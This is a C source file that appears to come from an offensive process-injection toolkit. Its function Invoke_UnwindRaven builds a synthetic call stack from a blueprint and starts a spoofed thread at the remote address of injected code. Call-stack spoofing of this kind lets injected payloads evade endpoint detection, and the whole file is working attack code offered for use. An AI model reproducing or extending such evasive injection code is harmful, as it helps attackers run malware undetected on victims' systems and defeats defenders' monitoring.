#include "unwindraven_integration.h"
#include "dispatch.h"
#include "payload.h"

#include "blueprint_library.h"

#include <stdio.h>

#define UR_MAX_BP_ENTRIES   64
#define UR_MAX_STACK_FRAMES 64

BOOL Invoke_UnwindRaven(PINJECTION_CONTEXT ctx)
{
    printf("[DEBUG] Running Invoke_UnwindRaven\n");

    UR_STACK_CONTEXT sctx = {0};
    StackFrame frames[UR_MAX_STACK_FRAMES];
    int frameCount = 0;

    if (!BuildSyntheticStackFromBlueprint(&sctx,
                                          blueprint,
                                          bpCount,
                                          frames,
                                          &frameCount))
    {
        printf("[-] Invoke_UnwindRaven: failed to build synthetic stack.\n");
        return FALSE;
    }

    DumpSyntheticStack(frames, frameCount);

    printf("[*] Invoke_UnwindRaven: running start spoofed thread.\n");

    HANDLE hSpoofed = StartSpoofedThread(
        frames,
        frameCount,
        (void*)ctx->pRemoteAddress,
        ctx,
        NULL,
        NULL,
        NULL
    );

    if (!hSpoofed)
    {
        printf("[-] Invoke_UnwindRaven: failed to start spoofed thread.\n");
        return FALSE;
    }

    // blocking for the thread to run
    WaitForSingleObject(hSpoofed, INFINITE);

    printf("Invoke_UnwindRaven: flavor=%d\n", ctx->invokeFlavor);

    printf("Invoke_UnwindRaven: has returned from entryPoint\n");

    return (ctx->hThread != NULL);
}